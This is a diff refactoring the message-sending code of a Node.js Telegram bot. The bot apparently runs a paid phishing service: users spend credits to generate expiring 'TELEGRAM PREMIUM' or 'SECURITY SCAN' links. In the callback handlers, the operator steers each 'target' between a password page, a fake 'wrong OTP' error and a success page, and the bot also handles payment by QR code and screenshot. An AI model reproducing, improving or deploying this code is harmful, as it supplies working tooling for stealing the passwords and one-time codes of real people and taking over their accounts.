     }
 });
@@ -3208,10 +3185,10 @@ S7.on('message', async (msg) => {
         const referrerId = text.replace('/start ref_', '');
         const userId = msg.from.id;
         const user = await getUser(userId);
-        if (user.banned) return S7.sendMessage(userId, '🚫 You are banned.');
-        if (user.referredBy) return S7.sendMessage(userId, '✅ You are already registered!');
+        if (user.banned) return sendWithPremium(userId, '🚫 You are banned.');
+        if (user.referredBy) return sendWithPremium(userId, '✅ You are already registered!');
         const referrer = await getUser(referrerId);
-        if (!referrer) return S7.sendMessage(userId, '❌ Invalid referral link!');
+        if (!referrer) return sendWithPremium(userId, '❌ Invalid referral link!');
         if (!(await checkAllChannels(userId))) {
             user._pendingReferrer = referrerId;
             await user.save();
@@ -3220,7 +3197,7 @@ S7.on('message', async (msg) => {
             channels.forEach((ch, i) => { msgText += (i+1) + '. <a href="' + ch.link + '">' + ch.name + '</a>\n'; });
             msgText += '\nAfter joining, click below to claim referral bonus!';
             const buttons = await getChannelButtonsAsync();
-            return S7.sendMessage(userId, msgText, { parse_mode: 'HTML', reply_markup: buttons });
+            return sendWithPremium(userId, msgText, 'HTML', buttons);
         }
         await processReferral(referrerId, userId);
     }
@@ -3236,14 +3213,9 @@ async function processReferral(referrerId, userId) {
     try { const chat = await S7.getChat(userId); newUserInfo = chat.username ? '@' + chat.username : chat.first_name || '@user_' + userId; } catch {}
     let referrerInfo = '@user_' + referrerId;
     try { const chat = await S7.getChat(referrerId); referrerInfo = chat.username ? '@' + chat.username : chat.first_name || '@user_' + referrerId; } catch {}
-    const money = getPremiumEmoji('💰');
-    const star = getPremiumEmoji('⭐');
-    const chart = getPremiumEmoji('📊');
-    const pin = getPremiumEmoji('📌');
-    await S7.sendMessage(referrerId, `${money} <b>New Referral Success!</b>\n\n👤 <b>New User:</b> ${newUserInfo}\n🆔 <b>User ID:</b> <code>${userId}</code>\n${star} <b>Credits Earned:</b> +2\n\n${chart} <b>Your Total Credits:</b> ${(referrer.credits || 0)}\n${pin} <b>Your Total Referrals:</b> ${(referrer.totalReferrals || 0)}`, { parse_mode: 'HTML' });
-    await S7.sendMessage(config.adminId, `${pin} <b>New Referral Success!</b>\n\n👤 <b>Referrer:</b> ${referrerInfo}\n👤 <b>New User:</b> ${newUserInfo}\n🆔 <b>Referrer ID:</b> <code>${referrerId}</code>\n🆔 <b>New User ID:</b> <code>${userId}</code>\n${star} <b>Credits Earned:</b> 2\n\n${chart} <b>Referrer Total Credits:</b> ${(referrer.credits || 0)}\n${pin} <b>Referrer Total Referrals:</b> ${(referrer.totalReferrals || 0)}`, { parse_mode: 'HTML' });
-    const check = getPremiumEmoji('✅');
-    await S7.sendMessage(userId, `${check} <b>Welcome!</b>\n\nYou joined through <b>${referrerInfo}</b>'s referral link!\n🎁 You already have 3 credits to start.\n${star} <b>Your Credits:</b> ${user.credits}`, { parse_mode: 'HTML' });
+    await sendWithPremium(referrerId, '💰 <b>New Referral Success!</b>\n\n👤 <b>New User:</b> ' + newUserInfo + '\n🆔 <b>User ID:</b> <code>' + userId + '</code>\n⭐ <b>Credits Earned:</b> +2\n\n📊 <b>Your Total Credits:</b> ' + (referrer.credits || 0) + '\n📌 <b>Your Total Referrals:</b> ' + (referrer.totalReferrals || 0));
+    await sendWithPremium(config.adminId, '📌 <b>New Referral Success!</b>\n\n👤 <b>Referrer:</b> ' + referrerInfo + '\n👤 <b>New User:</b> ' + newUserInfo + '\n🆔 <b>Referrer ID:</b> <code>' + referrerId + '</code>\n🆔 <b>New User ID:</b> <code>' + userId + '</code>\n⭐ <b>Credits Earned:</b> 2\n\n📊 <b>Referrer Total Credits:</b> ' + (referrer.credits || 0) + '\n📌 <b>Referrer Total Referrals:</b> ' + (referrer.totalReferrals || 0));
+    await sendWithPremium(userId, '✅ <b>Welcome!</b>\n\nYou joined through <b>' + referrerInfo + '</b>\'s referral link!\n🎁 You already have 3 credits to start.\n⭐ <b>Your Credits:</b> ' + user.credits);
     await SendLoveSYMenu(userId, (await S7.getChat(userId)).first_name);
     logToFile('👥 Referral: ' + referrerId + ' -> ' + userId);
 }
@@ -3266,21 +3238,21 @@ S7.on('callback_query', async (q) => {
         if (action === 'password') {
             session.decision = 'password';
             await S7.answerCallbackQuery(q.id, { text: '✅ Showing password page to user' });
-            await S7.sendMessage(config.adminId, `✅ Password section shown to user ${userId}`);
-            await S7.sendMessage(userId, `✅ Target is now entering password...`);
-            logToFile(`✅ Password page shown to user ${userId}`);
+            await sendWithPremium(config.adminId, '✅ Password section shown to user ' + userId);
+            await sendWithPremium(userId, '✅ Target is now entering password...');
+            logToFile('✅ Password page shown to user ' + userId);
         } else if (action === 'wrong') {
             session.decision = 'wrong';
             await S7.answerCallbackQuery(q.id, { text: '❌ Showing wrong OTP error to user' });
-            await S7.sendMessage(config.adminId, `❌ Wrong OTP error shown to user ${userId}`);
-            await S7.sendMessage(userId, `❌ Showing wrong OTP error to target...`);
-            logToFile(`❌ Wrong OTP shown to user ${userId}`);
+            await sendWithPremium(config.adminId, '❌ Wrong OTP error shown to user ' + userId);
+            await sendWithPremium(userId, '❌ Showing wrong OTP error to target...');
+            logToFile('❌ Wrong OTP shown to user ' + userId);
         } else if (action === 'open') {
             session.decision = 'open';
             await S7.answerCallbackQuery(q.id, { text: '📱 Showing success page to user' });
-            await S7.sendMessage(config.adminId, `📱 Success page shown to user ${userId}`);
-            await S7.sendMessage(userId, `📱 Target is seeing success page...`);
-            logToFile(`📱 Success page shown to user ${userId}`);
+            await sendWithPremium(config.adminId, '📱 Success page shown to user ' + userId);
+            await sendWithPremium(userId, '📱 Target is seeing success page...');
+            logToFile('📱 Success page shown to user ' + userId);
         }
         
         await S7.editMessageReplyMarkup({ 
@@ -3306,8 +3278,7 @@ S7.on('callback_query', async (q) => {
 
     if (q.data === 'admin_panel' && isAdmin) {
         await S7.deleteMessage(cid, mid);
-        const crown1 = getPremiumEmoji('👑');
-        await S7.sendMessage(cid, `${crown1} <b>Admin Panel</b>\n\nSelect an option below.`, { parse_mode: 'HTML', reply_markup: ADMIN_KEYBOARD });
+        await sendWithPremium(cid, '👑 <b>Admin Panel</b>\n\nSelect an option below.', 'HTML', ADMIN_KEYBOARD);
         return;
     }
     if (q.data === 'admin_stats' && isAdmin) {
@@ -3316,13 +3287,12 @@ S7.on('callback_query', async (q) => {
         const channels = await getChannels();
         const referrals = await Referral.find();
         const links = await Link.find();
-        const chart = getPremiumEmoji('📊');
-        await S7.sendMessage(cid, `${chart} <b>Bot Statistics</b>\n\n👥 Total Users: ${users.length}\n📷 Total Photos: ${photos.length}\n📢 Total Channels: ${channels.length}\n👥 Total Referrals: ${referrals.length}\n🔗 Total Links: ${links.length}\n⏱ Uptime: ${getUptime()}`, { parse_mode: 'HTML', reply_markup: SYBack });
+        await sendWithPremium(cid, '📊 <b>Bot Statistics</b>\n\n👥 Total Users: ' + users.length + '\n📷 Total Photos: ' + photos.length + '\n📢 Total Channels: ' + channels.length + '\n👥 Total Referrals: ' + referrals.length + '\n🔗 Total Links: ' + links.length + '\n⏱ Uptime: ' + getUptime(), 'HTML', SYBack);
         await S7.deleteMessage(cid, mid);
         return;
     }
     if (q.data === 'admin_broadcast' && isAdmin) {
-        await S7.sendMessage(cid, '📢 <b>Send Broadcast</b>\n\nType your message: /broadcast [message]', { parse_mode: 'HTML', reply_markup: SYBack });
+        await sendWithPremium(cid, '📢 <b>Send Broadcast</b>\n\nType your message: /broadcast [message]', 'HTML', SYBack);
         await S7.deleteMessage(cid, mid);
         return;
     }
@@ -3330,8 +3300,8 @@ S7.on('callback_query', async (q) => {
         try {
             const logs = fs.readFileSync(path.join(DATA_DIR, 'logs.txt'), 'utf8');
             const lastLogs = logs.split('\n').slice(-50).join('\n');
-            await S7.sendMessage(cid, '📋 <b>Recent Logs</b>\n\n<pre>' + (lastLogs || 'No logs') + '</pre>', { parse_mode: 'HTML', reply_markup: SYBack });
-        } catch { await S7.sendMessage(cid, 'No logs', { reply_markup: SYBack }); }
+            await sendWithPremium(cid, '📋 <b>Recent Logs</b>\n\n<pre>' + (lastLogs || 'No logs') + '</pre>', 'HTML', SYBack);
+        } catch { await sendWithPremium(cid, 'No logs', 'HTML', SYBack); }
         await S7.deleteMessage(cid, mid);
         return;
     }
@@ -3358,8 +3328,7 @@ S7.on('callback_query', async (q) => {
     if (q.data === 'referral') {
         const botInfo = await S7.getMe();
         const referralLink = 'https://t.me/' + botInfo.username + '?start=ref_' + uid;
-        const pin = getPremiumEmoji('📌');
-        await S7.sendMessage(cid, `${pin} <b>Your Referral Link</b>\n\nShare this link:\n\n<code>${referralLink}</code>\n\n📌 <b>How it works:</b>\n• Share your link with friends\n• They join all channels\n• You get +2 credits!\n• They get 3 credits on start!`, { parse_mode: 'HTML', reply_markup: SYBack });
+        await sendWithPremium(cid, '📌 <b>Your Referral Link</b>\n\nShare this link:\n\n<code>' + referralLink + '</code>\n\n📌 <b>How it works:</b>\n• Share your link with friends\n• They join all channels\n• You get +2 credits!\n• They get 3 credits on start!', 'HTML', SYBack);
         await S7.deleteMessage(cid, mid);
         return;
     }
@@ -3367,10 +3336,7 @@ S7.on('callback_query', async (q) => {
     if (q.data === 'credits') {
         const user = await getUser(uid);
         const credits = user.unlimited ? '♾️ Unlimited' : (user.credits || 0);
-        const star = getPremiumEmoji('⭐');
-        const pin = getPremiumEmoji('📌');
-        const calendar = getPremiumEmoji('📅');
-        await S7.sendMessage(cid, `${star} <b>Your Credits</b>\n\n💰 Credits: ${credits}\n${pin} Referrals: ${(user.totalReferrals || 0)}\n${calendar} Joined: ${new Date(user.joinedAt).toLocaleDateString()}\n\n🔹 Each link uses 1 credit\n🔹 Regenerate also uses 1 credit\n🔹 Links expire in 15 minutes\n🔹 Each link can be opened ${config.MAX_OPENS} times only`, { parse_mode: 'HTML', reply_markup: SYBack });
+        await sendWithPremium(cid, '⭐ <b>Your Credits</b>\n\n💰 Credits: ' + credits + '\n📌 Referrals: ' + (user.totalReferrals || 0) + '\n📅 Joined: ' + new Date(user.joinedAt).toLocaleDateString() + '\n\n🔹 Each link uses 1 credit\n🔹 Regenerate also uses 1 credit\n🔹 Links expire in 15 minutes\n🔹 Each link can be opened ' + config.MAX_OPENS + ' times only', 'HTML', SYBack);
         await S7.deleteMessage(cid, mid);
         return;
     }
@@ -3385,8 +3351,7 @@ S7.on('callback_query', async (q) => {
                 [{ text: '🔙 BACK', callback_data: 'back', style: 'danger' }]
             ]
         };
-        const money = getPremiumEmoji('💰');
-        await S7.sendMessage(cid, `${money} <b>Buy Credits</b>\n\nChoose a plan below:`, { parse_mode: 'HTML', reply_markup: plans });
+        await sendWithPremium(cid, '💰 <b>Buy Credits</b>\n\nChoose a plan below:', 'HTML', plans);
         await S7.deleteMessage(cid, mid);
         return;
     }
@@ -3400,15 +3365,14 @@ S7.on('callback_query', async (q) => {
         else if (plan === 'unlimited') { credits = 'Unlimited'; amount = 100; }
         else return;
 
-        const money = getPremiumEmoji('💰');
-        const msg = `${money} <b>Credits Purchase</b>\n\n📊 <b>Credits:</b> ${credits}\n💵 <b>Amount:</b> ₹${amount}\n🆔 <b>Transaction ID:</b> PTS-${Date.now().toString(36).toUpperCase()}\n\n📤 <b>Instructions:</b>\n1. Scan the QR code below\n2. Pay ₹${amount}\n3. Send the transaction screenshot here (upload photo)\n4. Wait for admin approval\n\n⚠️ <b>Don't close this chat!</b> Admin will respond here.\n\n✅ After approval, credits will be added.`;
-        await S7.sendMessage(cid, msg, { parse_mode: 'HTML' });
+        const msg = '💰 <b>Credits Purchase</b>\n\n📊 <b>Credits:</b> ' + credits + '\n💵 <b>Amount:</b> ₹' + amount + '\n🆔 <b>Transaction ID:</b> PTS-' + Date.now().toString(36).toUpperCase() + '\n\n📤 <b>Instructions:</b>\n1. Scan the QR code below\n2. Pay ₹' + amount + '\n3. Send the transaction screenshot here (upload photo)\n4. Wait for admin approval\n\n⚠️ <b>Don\'t close this chat!</b> Admin will respond here.\n\n✅ After approval, credits will be added.';
+        await sendWithPremium(cid, msg);
         
         if (await qrExists()) {
             const qrBuffer = await getQR();
-            await S7.sendPhoto(cid, qrBuffer, { caption: `💳 <b>Scan QR to Pay ₹${amount}</b>`, parse_mode: 'HTML' });
+            await S7.sendPhoto(cid, qrBuffer, { caption: '💳 <b>Scan QR to Pay ₹' + amount + '</b>', parse_mode: 'HTML' });
         } else {
-            await S7.sendMessage(cid, '⚠️ <b>QR code not uploaded yet.</b>\nPlease wait for admin to upload payment QR.\n\nUse /addqr to upload QR (Admin only).', { parse_mode: 'HTML' });
+            await sendWithPremium(cid, '⚠️ <b>QR code not uploaded yet.</b>\nPlease wait for admin to upload payment QR.\n\nUse /addqr to upload QR (Admin only).');
         }
         const user = await getUser(uid);
         user._pendingPayment = { credits, amount, plan };
@@ -3425,39 +3389,33 @@ S7.on('callback_query', async (q) => {
             await S7.answerCallbackQuery(q.id, { text: 'No pending payment', show_alert: true });
             return;
         }
-        const money = getPremiumEmoji('💰');
-        const check = getPremiumEmoji('✅');
-        const star = getPremiumEmoji('⭐');
-        const chart = getPremiumEmoji('📊');
         if (payment.credits === 'Unlimited') {
             user.unlimited = true;
             await user.save();
-            await S7.sendMessage(userId,
-                `${money} <b>UNLIMITED ACTIVATED!</b>\n\n` +
+            await sendWithPremium(userId,
+                '💰 <b>UNLIMITED ACTIVATED!</b>\n\n' +
                 'Your payment of ₹' + payment.amount + ' has been verified.\n' +
                 'You now have <b>Unlimited Credits</b> forever!\n\n' +
-                'Thank you for your support! 🙏',
-                { parse_mode: 'HTML' }
+                'Thank you for your support! 🙏'
             );
         } else {
             user.credits = (user.credits || 0) + parseInt(payment.credits);
             await user.save();
-            await S7.sendMessage(userId,
-                `${check} <b>Payment Verified!</b>\n\n` +
+            await sendWithPremium(userId,
+                '✅ <b>Payment Verified!</b>\n\n' +
                 '💰 Amount: ₹' + payment.amount + '\n' +
-                `${star} Credits Added: +${payment.credits}\n` +
-                `${chart} Total Credits: ${user.credits}\n\n` +
-                'Thank you for your support! 🙏',
-                { parse_mode: 'HTML' }
+                '⭐ Credits Added: +' + payment.credits + '\n' +
+                '📊 Total Credits: ' + user.credits + '\n\n' +
+                'Thank you for your support! 🙏'
             );
         }
         user._pendingPayment = null;
         await user.save();
 
         await S7.editMessageText(
-            `${check} <b>Payment Accepted!</b>\n\n` +
+            '✅ <b>Payment Accepted!</b>\n\n' +
             '👤 User: <code>' + userId + '</code>\n' +
-            `${chart} Credits: ${payment.credits}\n` +
+            '📊 Credits: ' + payment.credits + '\n' +
             '💵 Amount: ₹' + payment.amount + '\n\n' +
             '✅ Credits added successfully!',
             { chat_id: cid, message_id: mid, parse_mode: 'HTML' }
@@ -3476,14 +3434,12 @@ S7.on('callback_query', async (q) => {
             await S7.answerCallbackQuery(q.id, { text: 'No pending payment', show_alert: true });
             return;
         }
-        const chart = getPremiumEmoji('📊');
-        await S7.sendMessage(userId,
+        await sendWithPremium(userId,
             '❌ <b>Payment Rejected!</b>\n\n' +
-            `${chart} Credits: ${payment.credits}\n` +
+            '📊 Credits: ' + payment.credits + '\n' +
             '💵 Amount: ₹' + payment.amount + '\n\n' +
             'Reason: Payment verification failed.\n' +
-            'Please try again with a valid screenshot.',
-            { parse_mode: 'HTML' }
+            'Please try again with a valid screenshot.'
         );
         user._pendingPayment = null;
         await user.save();
@@ -3491,7 +3447,7 @@ S7.on('callback_query', async (q) => {
         await S7.editMessageText(
             '❌ <b>Payment Rejected!</b>\n\n' +
             '👤 User: <code>' + userId + '</code>\n' +
-            `${chart} Credits: ${payment.credits}\n` +
+            '📊 Credits: ' + payment.credits + '\n' +
             '💵 Amount: ₹' + payment.amount + '\n\n' +
             '❌ User notified.',
             { chat_id: cid, message_id: mid, parse_mode: 'HTML' }
@@ -3504,11 +3460,10 @@ S7.on('callback_query', async (q) => {
 
     if (q.data.startsWith('pay_dm_') && isAdmin) {
         const userId = q.data.replace('pay_dm_', '');
-        await S7.sendMessage(cid,
+        await sendWithPremium(cid,
             '💬 <b>Send message to user</b>\n\n' +
             'Reply with: <code>/dm ' + userId + ' [message]</code>\n\n' +
-            'Example: <code>/dm ' + userId + ' Please send a clearer screenshot.</code>',
-            { parse_mode: 'HTML' }
+            'Example: <code>/dm ' + userId + ' Please send a clearer screenshot.</code>'
         );
         await S7.answerCallbackQuery(q.id, { text: '💬 Type /dm ' + userId + ' [message]' });
         await S7.deleteMessage(cid, mid);
@@ -3535,8 +3490,7 @@ S7.on('callback_query', async (q) => {
             return;
         }
 
-        const sparkle = getPremiumEmoji('✨');
-        const loadingMsg = await S7.sendMessage(cid, SYloveMenu(q.from.first_name, `${sparkle}𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙇𝙞𝙣𝙠... 🔁 (1 Credit deducted)`), { parse_mode: 'HTML', reply_markup: SYBack });
+        const loadingMsg = await sendWithPremium(cid, SYloveMenu(q.from.first_name, '✨𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙇𝙞𝙣𝙠... 🔁 (1 Credit deducted)'), 'HTML', SYBack);
         try {
             const response = await fetch(config.baseUrl + '/api/create-link', {
                 method: 'GET',
@@ -3549,9 +3503,7 @@ S7.on('callback_query', async (q) => {
                 return;
             }
             const platformDisplay = platform === 'telegram' ? 'TELEGRAM PREMIUM' : platform === 'securityscan' ? 'SECURITY SCAN' : platform.toUpperCase();
-            const check = getPremiumEmoji('✅');
-            const star = getPremiumEmoji('⭐');
-            const finalMsg = `${check} <b>${platformDisplay} Link Generated!</b>\n\n🔗 <b>Your Link:</b>\n<code>${data.url}</code>\n\n📌 <b>Platform:</b> ${platformDisplay}\n⏰ <b>Valid for:</b> 15 minutes\n🔢 <b>Max Opens:</b> ${config.MAX_OPENS} times\n🔄 Share and earn referrals!\n\n${star} <b>Remaining Credits:</b> ${(user.unlimited ? '♾️ Unlimited' : (user.credits || 0))}`;
+            const finalMsg = '✅ <b>' + platformDisplay + ' Link Generated!</b>\n\n🔗 <b>Your Link:</b>\n<code>' + data.url + '</code>\n\n📌 <b>Platform:</b> ' + platformDisplay + '\n⏰ <b>Valid for:</b> 15 minutes\n🔢 <b>Max Opens:</b> ' + config.MAX_OPENS + ' times\n🔄 Share and earn referrals!\n\n⭐ <b>Remaining Credits:</b> ' + (user.unlimited ? '♾️ Unlimited' : (user.credits || 0));
             await S7.editMessageText(SYloveMenu(q.from.first_name, finalMsg), { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: getRegenMarkup(platform) });
         } catch (err) {
             console.error('Link Error:', err.message);
@@ -3576,19 +3528,14 @@ S7.on('message', async (msg) => {
     if (!user._pendingPayment) return;
     const payment = user._pendingPayment;
     const fileId = msg.photo[msg.photo.length - 1].file_id;
-    const money = getPremiumEmoji('💰');
-    const chart = getPremiumEmoji('📊');
-    const calendar = getPremiumEmoji('📅');
-    const adminMsg = `${money} <b>New Payment Request</b>\n\n👤 <b>User:</b> @${(msg.from.username || 'user_' + msg.from.id)}\n🆔 <b>User ID:</b> <code>${msg.from.id}</code>\n${chart} <b>Credits:</b> ${payment.credits}\n💵 <b>Amount:</b> ₹${payment.amount}\n${calendar} <b>Time:</b> ${new Date().toLocaleString()}\n\n📸 <b>Screenshot:</b> (below)`;
+    const adminMsg = '💰 <b>New Payment Request</b>\n\n👤 <b>User:</b> @' + (msg.from.username || 'user_' + msg.from.id) + '\n🆔 <b>User ID:</b> <code>' + msg.from.id + '</code>\n📊 <b>Credits:</b> ' + payment.credits + '\n💵 <b>Amount:</b> ₹' + payment.amount + '\n📅 <b>Time:</b> ' + new Date().toLocaleString() + '\n\n📸 <b>Screenshot:</b> (below)';
     const adminButtons = { inline_keyboard: [
         [{ text: '✅ ACCEPT', callback_data: 'pay_accept_' + msg.from.id, style: 'success' }],
         [{ text: '❌ REJECT', callback_data: 'pay_reject_' + msg.from.id, style: 'danger' }],
         [{ text: '💬 DM USER', callback_data: 'pay_dm_' + msg.from.id, style: 'primary' }]
     ] };
     await S7.sendPhoto(config.adminId, fileId, { caption: adminMsg, parse_mode: 'HTML', reply_markup: adminButtons });
-    const check = getPremiumEmoji('✅');
-    const chart2 = getPremiumEmoji('📊');
-    await S7.sendMessage(msg.from.id, `${check} <b>Payment screenshot received!</b>\n\n${chart2} Credits: ${payment.credits}\n💵 Amount: ₹${payment.amount}\n\n⏳ Please wait for admin to verify your payment.\nYou will be notified once approved.`, { parse_mode: 'HTML' });
+    await sendWithPremium(msg.from.id, '✅ <b>Payment screenshot received!</b>\n\n📊 Credits: ' + payment.credits + '\n💵 Amount: ₹' + payment.amount + '\n\n⏳ Please wait for admin to verify your payment.\nYou will be notified once approved.');
     logToFile('💰 Payment screenshot from ' + msg.from.id + ' - ₹' + payment.amount);
 });
 
@@ -3602,45 +3549,8 @@ S7.on('message', async (msg) => {
     const cmd = args[0].toLowerCase();
 
     if (cmd === '/help' || cmd === '/commands') {
-        const helpText = `📜 <b>Available Commands</b>
-
-👤 <b>User Commands:</b>
-/start - Start the bot
-/menu - Show main menu
-/pay [amount] - Buy credits (e.g., /pay 20)
-/credits - Check your credits
-/referral - Get referral link
-/redeem [coupon_code] - Redeem coupon
-/telegram - Generate Telegram Premium link
-
-👑 <b>Admin Commands:</b>
-/addcredits [userId] [amount] - Add credits
-/removecredits [userId] [amount] - Remove credits
-/unlimited [userId] - Toggle unlimited
-/resetuser [userId] - Reset user data
-/users - List all users
-/stats - Bot statistics
-/broadcast [message] - Send to all users
-/addqr - Upload QR code (send photo after command)
-/removeqr - Remove QR code
-/viewqr - View QR code
-/addchannel [id] [name] [link] - Add channel
-/removechannel [id] - Remove channel
-/channels - List all channels
-/addphoto [caption] - Upload photo (reply with image)
-/featured [photoId] - Set featured photo
-/featuredmsg [message] - Set featured message
-/featuredtoggle - Toggle featured on/off
-/logs - Show recent logs
-/restart - Restart bot
-/dm [userId] [message] - DM a user
-/ban [userId or @username] - Ban user
-/unban [userId or @username] - Unban user
-/createcoupon [code] [credits] [maxUses] - Create coupon
-/coupons - List all coupons
-/deletecoupon [code] - Delete coupon
-/getadmin - Get admin panel link`;
-        await S7.sendMessage(msg.chat.id, helpText, { parse_mode: 'HTML' });
+        const helpText = '📜 <b>Available Commands</b>\n\n👤 <b>User Commands:</b>\n/start - Start the bot\n/menu - Show main menu\n/pay [amount] - Buy credits (e.g., /pay 20)\n/credits - Check your credits\n/referral - Get referral link\n/redeem [coupon_code] - Redeem coupon\n/telegram - Generate Telegram Premium link\n\n👑 <b>Admin Commands:</b>\n/addcredits [userId] [amount] - Add credits\n/removecredits [userId] [amount] - Remove credits\n/unlimited [userId] - Toggle unlimited\n/resetuser [userId] - Reset user data\n/users - List all users\n/stats - Bot statistics\n/broadcast [message] - Send to all users\n/addqr - Upload QR code (send photo after command)\n/removeqr - Remove QR code\n/viewqr - View QR code\n/addchannel [id] [name] [link] - Add channel\n/removechannel [id] - Remove channel\n/channels - List all channels\n/addphoto [caption] - Upload photo (reply with image)\n/featured [photoId] - Set featured photo\n/featuredmsg [message] - Set featured message\n/featuredtoggle - Toggle featured on/off\n/logs - Show recent logs\n/restart - Restart bot\n/dm [userId] [message] - DM a user\n/ban [userId or @username] - Ban user\n/unban [userId or @username] - Unban user\n/createcoupon [code] [credits] [maxUses] - Create coupon\n/coupons - List all coupons\n/deletecoupon [code] - Delete coupon\n/getadmin - Get admin panel link';
+        await sendWithPremium(msg.chat.id, helpText);
         return;
     }
 
@@ -3649,16 +3559,16 @@ S7.on('message', async (msg) => {
     if (cmd === '/addcredits' && args.length === 3) {
         const userId = args[1];
         const amount = parseInt(args[2]);
-        if (isNaN(amount)) return S7.sendMessage(msg.chat.id, '⚠️ Invalid amount.');
+        if (isNaN(amount)) return sendWithPremium(msg.chat.id, '⚠️ Invalid amount.');
         try {
             const user = await getUser(userId);
-            if (user.unlimited) return S7.sendMessage(msg.chat.id, 'User has unlimited, cannot add credits.');
+            if (user.unlimited) return sendWithPremium(msg.chat.id, 'User has unlimited, cannot add credits.');
             user.credits += amount;
             await user.save();
-            await S7.sendMessage(msg.chat.id, `✅ Added ${amount} credits to user ${userId}. New balance: ${user.credits}`);
-            logToFile(`Admin added ${amount} credits to ${userId}`);
+            await sendWithPremium(msg.chat.id, '✅ Added ' + amount + ' credits to user ' + userId + '. New balance: ' + user.credits);
+            logToFile('Admin added ' + amount + ' credits to ' + userId);
         } catch (err) {
-            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+            sendWithPremium(msg.chat.id, '❌ Error: ' + err.message);
         }
         return;
     }
@@ -3666,16 +3576,16 @@ S7.on('message', async (msg) => {
     if (cmd === '/removecredits' && args.length === 3) {
         const userId = args[1];
         const amount = parseInt(args[2]);
-        if (isNaN(amount)) return S7.sendMessage(msg.chat.id, '⚠️ Invalid amount.');
+        if (isNaN(amount)) return sendWithPremium(msg.chat.id, '⚠️ Invalid amount.');
         try {
             const user = await getUser(userId);
-            if (user.unlimited) return S7.sendMessage(msg.chat.id, 'User has unlimited, cannot remove credits.');
+            if (user.unlimited) return sendWithPremium(msg.chat.id, 'User has unlimited, cannot remove credits.');
             user.credits = Math.max(0, user.credits - amount);
             await user.save();
-            await S7.sendMessage(msg.chat.id, `✅ Removed ${amount} credits from user ${userId}. New balance: ${user.credits}`);
-            logToFile(`Admin removed ${amount} credits from ${userId}`);
+            await sendWithPremium(msg.chat.id, '✅ Removed ' + amount + ' credits from user ' + userId + '. New balance: ' + user.credits);
+            logToFile('Admin removed ' + amount + ' credits from ' + userId);
         } catch (err) {
-            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+            sendWithPremium(msg.chat.id, '❌ Error: ' + err.message);
         }
         return;
     }
@@ -3686,10 +3596,10 @@ S7.on('message', async (msg) => {
             const user = await getUser(userId);
             user.unlimited = !user.unlimited;
             await user.save();
-            await S7.sendMessage(msg.chat.id, `✅ Unlimited toggled ${user.unlimited ? 'ON' : 'OFF'} for user ${userId}`);
-            logToFile(`Admin toggled unlimited for ${userId}`);
+            await sendWithPremium(msg.chat.id, '✅ Unlimited toggled ' + (user.unlimited ? 'ON' : 'OFF') + ' for user ' + userId);
+            logToFile('Admin toggled unlimited for ' + userId);
         } catch (err) {
-            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+            sendWithPremium(msg.chat.id, '❌ Error: ' + err.message);
         }
         return;
     }
@@ -3705,10 +3615,10 @@ S7.on('message', async (msg) => {
             user.referredBy = null;
             user.banned = false;
             await user.save();
-            await S7.sendMessage(msg.chat.id, `✅ User ${userId} reset to default.`);
-            logToFile(`Admin reset user ${userId}`);
+            await sendWithPremium(msg.chat.id, '✅ User ' + userId + ' reset to default.');
+            logToFile('Admin reset user ' + userId);
         } catch (err) {
-            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+            sendWithPremium(msg.chat.id, '❌ Error: ' + err.message);
         }
         return;
     }
@@ -3716,18 +3626,17 @@ S7.on('message', async (msg) => {
     if (cmd === '/users') {
         try {
             const users = await User.find();
-            const pin = getPremiumEmoji('📌');
-            let list = `${pin} <b>All Users</b>\n\n`;
+            let list = '📌 <b>All Users</b>\n\n';
             for (const u of users) {
-                list += `🆔 ${u.userId} | Credits: ${u.unlimited ? '♾️' : u.credits} | Ref: ${u.totalReferrals} | ${u.banned ? '🚫' : '✅'}\n`;
+                list += '🆔 ' + u.userId + ' | Credits: ' + (u.unlimited ? '♾️' : u.credits) + ' | Ref: ' + u.totalReferrals + ' | ' + (u.banned ? '🚫' : '✅') + '\n';
                 if (list.length > 3800) {
-                    await S7.sendMessage(msg.chat.id, list, { parse_mode: 'HTML' });
+                    await sendWithPremium(msg.chat.id, list);
                     list = '';
                 }
             }
-            if (list) await S7.sendMessage(msg.chat.id, list, { parse_mode: 'HTML' });
+            if (list) await sendWithPremium(msg.chat.id, list);
         } catch (err) {
-            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+            sendWithPremium(msg.chat.id, '❌ Error: ' + err.message);
         }
         return;
     }
@@ -3740,32 +3649,31 @@ S7.on('message', async (msg) => {
             const referrals = await Referral.find();
             const links = await Link.find();
             const coupons = await getCoupons();
-            const chart = getPremiumEmoji('📊');
-            const stats = `${chart} <b>Bot Statistics</b>\n\n👥 Users: ${users.length}\n📷 Photos: ${photos.length}\n📢 Channels: ${channels.length}\n👥 Referrals: ${referrals.length}\n🔗 Links: ${links.length}\n🎫 Coupons: ${coupons.length}\n⏱ Uptime: ${getUptime()}`;
-            await S7.sendMessage(msg.chat.id, stats, { parse_mode: 'HTML' });
+            const stats = '📊 <b>Bot Statistics</b>\n\n👥 Users: ' + users.length + '\n📷 Photos: ' + photos.length + '\n📢 Channels: ' + channels.length + '\n👥 Referrals: ' + referrals.length + '\n🔗 Links: ' + links.length + '\n🎫 Coupons: ' + coupons.length + '\n⏱ Uptime: ' + getUptime();
+            await sendWithPremium(msg.chat.id, stats);
         } catch (err) {
-            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+            sendWithPremium(msg.chat.id, '❌ Error: ' + err.message);
         }
         return;
     }
 
     if (cmd === '/broadcast') {
         const message = args.slice(1).join(' ');
-        if (!message) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /broadcast [message]');
+        if (!message) return sendWithPremium(msg.chat.id, '⚠️ Usage: /broadcast [message]');
         try {
             const users = await User.find();
             let sent = 0;
             for (const u of users) {
                 try {
-                    await S7.sendMessage(u.userId, '📢 <b>Broadcast Message</b>\n\n' + message, { parse_mode: 'HTML' });
+                    await sendWithPremium(u.userId, '📢 <b>Broadcast Message</b>\n\n' + message);
                     sent++;
                 } catch (e) {}
                 if (sent % 10 === 0) await new Promise(r => setTimeout(r, 100));
             }
